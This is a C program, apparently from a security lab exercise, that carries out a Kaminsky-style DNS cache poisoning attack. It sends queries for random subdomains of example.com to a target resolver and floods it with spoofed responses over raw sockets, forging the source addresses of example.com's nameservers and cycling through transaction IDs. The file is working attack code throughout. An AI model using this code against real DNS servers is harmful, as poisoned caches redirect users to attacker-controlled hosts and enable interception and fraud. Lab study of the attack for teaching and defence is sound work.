#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_FILE_SIZE 1000000
#define SPOOF_PER_REQUEST 10000

// Example.com's nameservers
#define NS1 "199.43.133.53"
#define NS2 "199.43.135.53"

// Root A and B's nameservers
//#define NS1 "198.41.0.4"
//#define NS2 "192.228.79.201"


/* IP Header */
struct ipheader {
	unsigned char      iph_ihl : 4, //IP header length
		iph_ver : 4; //IP version
	unsigned char      iph_tos; //Type of service
	unsigned short int iph_len; //IP Packet length (data + header)
	unsigned short int iph_ident; //Identification
	unsigned short int iph_flag : 3, //Fragmentation flags
		iph_offset : 13; //Flags offset
	unsigned char      iph_ttl; //Time to Live
	unsigned char      iph_protocol; //Protocol type
	unsigned short int iph_chksum; //IP datagram checksum
	struct  in_addr    iph_sourceip; //Source IP address 
	struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char* buffer, int pkt_size);
void send_dns_request(unsigned char*, int, char*);
void send_dns_response(unsigned char* ip_resp, int n_resp,
	unsigned char* src_ip, char* name,
	unsigned short transaction_id);

int main()
{
	long i = 0;
	unsigned short transaction_id = 0;

	srand(time(NULL));

	// Load the DNS request packet from file
	FILE* f_req = fopen("ip_req.bin", "rb");
	if (!f_req) {
		perror("Can't open 'ip_req.bin'");
		exit(1);
	}
	unsigned char ip_req[MAX_FILE_SIZE];
	int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

	// Load the first DNS response packet from file
	FILE* f_resp = fopen("ip_resp.bin", "rb");
	if (!f_resp) {
		perror("Can't open 'ip_resp.bin'");
		exit(1);
	}
	unsigned char ip_resp[MAX_FILE_SIZE];
	int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

	char a[26] = "abcdefghijklmnopqrstuvwxyz";
	while (1) {
		// Generate a random name with length 5
		char name[6];
		for (int k = 0; k < 5; k++)  name[k] = a[rand() % 26];
		name[5] = 0;

		printf("attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\
n", ++i, name, transaction_id);

		// Step 1. Send a DNS request to the targeted local DNS server
		send_dns_request(ip_req, n_req, name);

		/* Step 2. Send spoofed responses to the targeted local DNS server.
		 *         The two IP addresses are example.com's actual nameservers.
		 *         We don't know which one is used by the local DNS server, so
		 *         we spoof the responses from both.    */
		for (int j = 0; j < SPOOF_PER_REQUEST; j++) {
			send_dns_response(ip_resp, n_resp, NS1, name, transaction_id);
			send_dns_response(ip_resp, n_resp, NS2, name, transaction_id);
			transaction_id = transaction_id + 1;
		}
	}
}

/* The template has a fixed "aaaaa" in the name field; we need
 *   to replace it with the actual name randomly generated from
 *   the attack. */
void send_dns_request(unsigned char* ip_req, int n_req, char* name)
{

	// Modify the name in the question field (offset=41)
	memcpy(ip_req + 41, name, 5);

	// Send the IP packet out
	send_raw_packet(ip_req, n_req);
}

/* We need to modify several fields in the template, including
 *   the source IP address, the two name fields (in question and answer
 *   sections), and the transaction ID.  */
void send_dns_response(unsigned char* ip_resp, int n_resp,
	unsigned char* src_ip, char* name,
	unsigned short transaction_id)
{
	// Modify the src IP in the IP header (offset=12)
	int ip = (int)inet_addr(src_ip);
	memcpy(ip_resp + 12, (void*)&ip, 4);

	// Modify the name in the question field (offset=41)
	memcpy(ip_resp + 41, name, 5);

	// Modify the name in the answer field (offset=64)
	memcpy(ip_resp + 64, name, 5);

	// Modify the transaction ID field (offset=28)
	unsigned short id[2];
	*id = htons(transaction_id);
	memcpy(ip_resp + 28, (void*)id, 2);

	// Send the IP packet out
	send_raw_packet(ip_resp, n_resp);
}


/* Send the raw packet out */
void send_raw_packet(char* buffer, int pkt_size)
{
	struct sockaddr_in dest_info;
	int enable = 1;

	// Step 1: Create a raw network socket.
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	// Step 2: Set socket option.
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
		&enable, sizeof(enable));

	// Step 3: Provide needed information about destination.
	struct ipheader* ip = (struct ipheader*)buffer;
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip->iph_destip;

	// Step 4: Send the packet out.
	sendto(sock, buffer, pkt_size, 0,
		(struct sockaddr*)&dest_info, sizeof(dest_info));
	close(sock);
}
